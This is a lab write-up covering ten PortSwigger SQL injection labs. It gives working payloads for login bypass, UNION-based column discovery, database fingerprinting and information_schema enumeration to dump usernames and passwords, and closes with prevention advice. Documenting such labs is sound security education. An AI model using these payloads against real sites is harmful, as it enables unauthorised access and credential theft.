---
title: 'PortSwigger SQL injection, part 1: reading data you should not see'
description: 'Ten Web Security Academy labs, from a single quote to reading the database''s own catalogue with UNION: what I typed, the signal that told me it worked, and how a real site should prevent it. No lab passwords.'
date: 2026-11-17
platform: 'PortSwigger Web Security Academy'
difficulty: 'Practitioner'
tags: ['sql-injection', 'web', 'union', 'burp']
draft: false
---

SQL injection happens when an application builds a database query by pasting user input straight into it. The database can't tell your data apart from the query's own text, so it runs what you typed as SQL. That lets you change what the query does: read rows you shouldn't, bypass a login, or dump another table.

This is part 1 of my notes from PortSwigger's Web Security Academy. It covers ten labs, grouped by technique, from the first probe to reading the database's own catalogue and dumping credentials. It's all in-band injection, where the answer comes back on the page; blind injection is part 2.

**Spoiler warning:** if you're doing these labs yourself, try each one before reading. There are no lab passwords or instance URLs here: each lab gives you a fresh one, and PortSwigger asks you not to publish them.

## Finding an injection point

You test one entry point at a time (a URL parameter, a header, a cookie) by sending input that would break or change a SQL query, then watching the response. What I leaned on:

```text
'               a single quote. If it breaks the query, the server
                often answers 500: the first sign the input reaches SQL.
' OR 1=1--      vs ' OR 1=2--. If the page differs between the two,
                the condition is being evaluated: the input is live SQL.
```

Two more exist for when the page shows nothing useful. A time delay (such as `pg_sleep(10)`) makes the database pause, so a slow answer means the query ran; and an out-of-band (OAST) payload makes the database call a server you control, for cases with no output, no error and no delay. Both belong to blind injection, so they're in part 2.

Throughout these labs my signal was the HTTP status: **500 meant my input reached the query and broke it; 200 meant the query ran.** That one distinction drives everything below.

## Changing what the WHERE clause returns

The shop filters products by category:

```text
GET /filter?category=Gifts
```

Behind it is a query that pastes the category straight in:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

`AND released = 1` is what hides unreleased products. If the category isn't parameterised, I control the text inside the quotes, so I can end the string early and comment out the rest:

```text
/filter?category=Gifts'--
```

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The `'` closes the string and `--` turns the rest of the line into a comment, so `AND released = 1` is gone and unreleased Gifts appear. To return *everything*, make the condition always true:

```text
/filter?category=Gifts'+OR+1=1--
```

**Lab — retrieval of hidden data.** Sending `'` returned 500, which told me the parameter reaches the query. Then `Gifts'+OR+1=1--` listed every product, released or not. Solved.

> Be careful with `OR 1=1` outside a lab. If the same input is reused in an `UPDATE` or `DELETE` somewhere, `OR 1=1` matches every row and changes or deletes the whole table.

## Logging in without a password

The login query checks the name and password together:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If I put this in the username field (and anything, or nothing, in the password):

```text
administrator'--
```

the password check becomes a comment:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

The database returns the administrator row and the app logs me in.

**Lab — login bypass.** Username `administrator'--`, password any single character (the form requires one on the client, but the database never sees it). The query matched the administrator row and I was in. Solved.

The one detail that cost me time: a notes app had silently turned my `--` into an em dash (`—`). The database doesn't read `—` as a comment, so the payload failed until I retyped the two hyphens. If a login-bypass payload looks right but doesn't work, check that your `--` is really two ASCII hyphens.

> This needs a username you already know. Without one, `' OR 1=1--` (or `' OR 1=1 LIMIT 1--`, depending on the database) returns the first row in the table, which is often an admin.

## UNION: reading other tables

When the page shows the query's results, `UNION` lets me bolt a second `SELECT` onto the first and read its rows in the same response:

```sql
SELECT name, price FROM products WHERE ... UNION SELECT username, password FROM users--
```

A `UNION` only runs if the injected `SELECT` matches the original on two points: the **same number of columns**, and **compatible types** in each position. So before reading anything, I have to learn the column count and which columns hold text.

**Column count.** I increment `ORDER BY` until it breaks:

```text
' ORDER BY 1--   200
' ORDER BY 2--   200
' ORDER BY 3--   200
' ORDER BY 4--   500   ← column 4 doesn't exist
```

The last number that returns 200 is the count. The other way is `UNION SELECT NULL`, adding `NULL`s until it stops erroring, because `NULL` fits any type:

```text
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Lab — number of columns.** `ORDER BY` broke on 4, so three columns. `UNION SELECT NULL,NULL,NULL--` returned 200 with a blank extra row. As a check I swapped the last `NULL` for `5`, and `$0.05` appeared on the page, which also told me column 3 is the price. Solved.

**Which column holds text.** I put a string in one position at a time:

```text
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

A text column echoes the `a`; a numeric one answers with a type error (500).

**Lab — finding a text column.** Columns 1 and 3 were numeric; column 2 took text. Injecting the lab's challenge string into position 2 rendered it in the product title. Solved.

**Reading the data.** With the count and a text column known, I point the second `SELECT` at the users table:

```text
' UNION SELECT username, password FROM users--
```

**Lab — retrieving data from other tables.** Two columns, both text. `UNION SELECT username, password FROM users--` printed the usernames and passwords inside the product list, including the administrator's. I logged in with them. Solved. (The password is per-instance, so there's nothing to publish.)

**When only one column takes text.** You can't split two fields across one column, so concatenate them with a separator:

```text
' UNION SELECT NULL, username || '~' || password FROM users--
```

Concatenation differs by database: `||` on Oracle, PostgreSQL and SQLite; `CONCAT(a, b)` on MySQL; `a + b` on SQL Server.

**Lab — multiple values in one column.** Column 1 was numeric and only column 2 took text, so dumping two fields failed with a type error. Putting `NULL` in position 1 and `username || '~' || password` in position 2 returned each pair as `administrator~<password>`, and I logged in. Solved.

## Asking the database about itself

UNION reads tables, but first I usually need to know *which* database I'm on and *what* it holds. Both go through the same UNION.

**Which engine, which version.** Each engine answers a different query, so the version string doubles as a fingerprint:

```text
Microsoft, MySQL   ' UNION SELECT @@version, NULL--
Oracle             ' UNION SELECT banner, NULL FROM v$version--
PostgreSQL         ' UNION SELECT version(), NULL--
```

**Lab — database type and version (MySQL/Microsoft).** This one taught me the MySQL comment rule the hard way. `' ORDER BY 1--` returned 500, because MySQL needs a space after `--`. The URL-encoded space, `--+`, fixed it, and `ORDER BY` broke on 3, so two columns. Then `@@version` in column 1 printed a MySQL 8.0.x string. `#` (encoded `%23`) works as a comment there too. Solved.

## Reading the database's catalogue

Every engine except Oracle describes itself through `information_schema`: `information_schema.tables` lists the tables, and `information_schema.columns` lists the columns of one. On a lab the names are randomised (something like `users_xxxxxx`, with columns `username_xxxxxx` and `password_xxxxxx`), so I can't guess them; I read them out first, then dump:

```text
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xxxxxx'--
' UNION SELECT username_xxxxxx || '~' || password_xxxxxx, NULL FROM users_xxxxxx--
```

**Lab — listing the database contents (non-Oracle).** Two columns. The first payload gave the real users-table name; the second, filtered to that table, gave the username and password column names; the third concatenated them into one text column and dumped the pairs. Logged in. Solved. (Per-instance credentials, so nothing to publish.)

## Two database quirks that bit me

- **Oracle** needs a `FROM` on every `SELECT`. With no real table, use the built-in one: `' UNION SELECT NULL FROM dual--`. Its version lives in `v$version`, not `@@version`.
- **MySQL** wants a space after `--` (write `-- ` or, in a URL, `--+`), or use `#` instead. This is the quirk that returned 500 in the version lab above until I added the space.

PortSwigger's [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) collects these per-database differences.

## How a real site prevents all of this

Every lab above comes from the same mistake: user input became part of the query's code. The fixes, roughly in order of how much they matter:

- **Parameterised queries (prepared statements).** The query text and the values travel separately, so input is only ever data, never SQL. This is the real fix; the rest is defence in depth. It applies anywhere input meets a query: `WHERE`, `INSERT`, `UPDATE`.
- **Allow-lists where parameters can't go.** A placeholder can't stand in for a table or column name, so `ORDER BY` and dynamic column names can't be parameterised. Map the user's choice to a fixed set of known-good names instead of pasting the input in.
- **Least privilege.** The app's database account should read and write only the tables it needs. It rarely needs to read `information_schema`, so revoking that alone blunts the enumeration in the last two labs; and a `UNION` into `users`, or a stray `DROP`, then has far less to reach.
- **Generic errors.** The 500 I relied on, and the version string the fingerprinting lab leaked, are both gifts to an attacker. Log the detail server-side and show a plain error page, so the query's shape and the engine stay hidden.

Input validation and escaping help, but they're not the fix: parameterisation is, because it removes the confusion between code and data at the source. Everything else just narrows what a missed spot can reach.

## What's next

Part 2 is blind SQL injection, where the page shows no results and no errors, so you read the database one yes/no question at a time, through conditional responses, forced errors, and time delays.
